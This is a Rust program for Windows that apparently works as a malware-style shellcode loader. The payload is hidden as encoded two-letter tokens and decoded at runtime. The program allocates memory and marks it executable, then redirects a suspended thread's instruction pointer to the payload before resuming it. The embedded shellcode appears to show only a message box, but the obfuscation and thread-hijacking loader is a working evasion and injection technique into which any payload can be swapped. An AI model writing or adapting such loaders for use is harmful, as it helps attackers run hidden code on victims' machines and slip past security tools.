use std::ptr;
use winapi::shared::ntdef::HANDLE;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::processthreadsapi::{
    CreateThread, GetThreadContext, ResumeThread, SetThreadContext,
};
use winapi::um::winbase::{FormatMessageA, CREATE_SUSPENDED};
use winapi::um::winnt::{
    CONTEXT, CONTEXT_CONTROL, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
};
use winapi::um::synchapi::WaitForSingleObject;

const SHELLCODE: &str = "ab ac ad ae af ag ag ag ah ai aj aj aj ak al ak am an al ao ac ap aq ar ac as an at au ac as an av au ac as an aw au ac as ax am au ac ay az ba ba bb ap bc ac ap bd be bf bg bh bi bj aw ak bk bc bl ak bm bk bn bo an ak al au ac as an aw au as bp bf ac bm ai au as bq br aj aj aj ac bs bd bt bu ac bm ai am au as ac av au bv as bw aw bx bm ai by bz ac ag bc au ak as ca br ac bm cb bb ap bc ac ap bd be ak bk bc bl ak bm bk cc cd ce cf au cg ch cg ci cj ck cl cm ce cb cn au bv as bw ci bx bm ai co au ak as cp ac au bv as bw cq bx bm ai au ak as cr br ac bm ai ak cn ak cn cs ct cu ak cn ak ct ak cu ac cv cw aw ak an ag cd cn ak ct cu au ac as cx cy bx ag ag ag cz au ac da da db bm aj aj ak dc cg dd de df ag dg bx dh bk aj aj aj aj au ac da di dj bm aj aj au cg da bs dk bm aj aj ac ap bc ak dc ck cv ao df ag dg ac ap bc ak dc af dl dm ao ag dg ac ar dn dn bu aw do bu ax dn dp aj bb ar dq dq bg dr ar bp bu ds aj ce dq ar ax dt du dv dp dn dn aj";

fn translate(s: &str) -> u8 {
    match s {
        "ab" => 252,
        "ac" => 72,
        "ad" => 129,
        "ae" => 228,
        "af" => 240,
        "ag" => 255,
        "ah" => 232,
        "ai" => 208,
        "aj" => 0,
        "ak" => 65,
        "al" => 81,
        "am" => 80,
        "an" => 82,
        "ao" => 86,
        "ap" => 49,
        "aq" => 210,
        "ar" => 101,
        "as" => 139,
        "at" => 96,
        "au" => 62,
        "av" => 24,
        "aw" => 32,
        "ax" => 114,
        "ay" => 15,
        "az" => 183,
        "ba" => 74,
        "bb" => 77,
        "bc" => 201,
        "bd" => 192,
        "be" => 172,
        "bf" => 60,
        "bg" => 97,
        "bh" => 124,
        "bi" => 2,
        "bj" => 44,
        "bk" => 193,
        "bl" => 13,
        "bm" => 1,
        "bn" => 226,
        "bo" => 237,
        "bp" => 66,
        "bq" => 128,
        "br" => 136,
        "bs" => 133,
        "bt" => 116,
        "bu" => 111,
        "bv" => 68,
        "bw" => 64,
        "bx" => 73,
        "by" => 227,
        "bz" => 92,
        "ca" => 52,
        "cb" => 214,
        "cc" => 56,
        "cd" => 224,
        "ce" => 117,
        "cf" => 241,
        "cg" => 76,
        "ch" => 3,
        "ci" => 36,
        "cj" => 8,
        "ck" => 69,
        "cl" => 57,
        "cm" => 209,
        "cn" => 88,
        "co" => 102,
        "cp" => 12,
        "cq" => 28,
        "cr" => 4,
        "cs" => 94,
        "ct" => 89,
        "cu" => 90,
        "cv" => 131,
        "cw" => 236,
        "cx" => 18,
        "cy" => 233,
        "cz" => 93,
        "da" => 141,
        "db" => 37,
        "dc" => 186,
        "dd" => 119,
        "de" => 38,
        "df" => 7,
        "dg" => 213,
        "dh" => 199,
        "di" => 149,
        "dj" => 14,
        "dk" => 26,
        "dl" => 181,
        "dm" => 162,
        "dn" => 108,
        "do" => 87,
        "dp" => 100,
        "dq" => 115,
        "dr" => 103,
        "ds" => 120,
        "dt" => 51,
        "du" => 50,
        "dv" => 46,
        _ => 0,
    }
}

#[no_mangle]
unsafe extern "system" fn dummy_thread_fn(_: *mut winapi::ctypes::c_void) -> u32 {
    0
}

fn explain_error() {
    let error = unsafe { GetLastError() };

    println!("Error code: {}", error);

    let mut buffer = [0u8; 1024];
    let formatted = unsafe {
        FormatMessageA(
            0x00001000,
            ptr::null_mut(),
            error,
            0,
            buffer.as_mut_ptr() as *mut i8,
            buffer.len() as u32,
            ptr::null_mut(),
        )
    };

    if formatted == 0 {
        println!("Failed to format error message");
        return;
    }

    let message = std::str::from_utf8(&buffer).unwrap();

    println!("Error: {}", message);
}

fn run_via_sacrificial_thread(h_thread: HANDLE) -> i32 {
    let shellcode_translated: Vec<u8> = SHELLCODE
        .split(' ')
        .map(|s| translate(s))
        .collect();

    let p_address = unsafe {
        VirtualAlloc(
            ptr::null_mut(),
            shellcode_translated.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if p_address.is_null() {
        println!("Failed to allocate memory");
        return 0;
    }

    unsafe {
        std::ptr::copy(
            shellcode_translated.as_ptr(),
            p_address as *mut u8,
            shellcode_translated.len(),
        )
    };


    let mut old_prot: u32 = 0;
    let mut ctx: CONTEXT = unsafe { std::mem::zeroed() };
    ctx.ContextFlags = CONTEXT_CONTROL;

    let protc_res = unsafe {
        VirtualProtect(
            p_address,
            SHELLCODE.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_prot,
        )
    };

    if protc_res == 0 {
        println!("Failed to change memory protection");
        explain_error();
        return 0;
    }
    println!("Memory protection changed");

    let get_ctx_res = unsafe { GetThreadContext(h_thread, &mut ctx) };

    if get_ctx_res == 0 {
        println!("Failed to get thread context");
        explain_error();
        return 0;
    }
    println!("Thread context retrieved");

    ctx.Rip = p_address as u64;

    let set_ctx_res = unsafe { SetThreadContext(h_thread, &ctx) };

    if set_ctx_res == 0 {
        println!("Failed to set thread context");
        explain_error();
        return 0;
    }
    println!("Thread context set");

    return 1;
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let h_thread = unsafe {
        CreateThread(
            ptr::null_mut(),
            0,
            Some(dummy_thread_fn),
            ptr::null_mut(),
            CREATE_SUSPENDED,
            ptr::null_mut(),
        )
    };

    if h_thread.is_null() {
        println!("Failed to create thread");
        explain_error();
        return Ok(());
    }

    if run_via_sacrificial_thread(h_thread) == 0 {
        return Ok(());
    }

    unsafe { ResumeThread(h_thread) };

    // Wait for the thread to finish
    unsafe { WaitForSingleObject(h_thread, 0xFFFFFFFF) };

    Ok(())
}
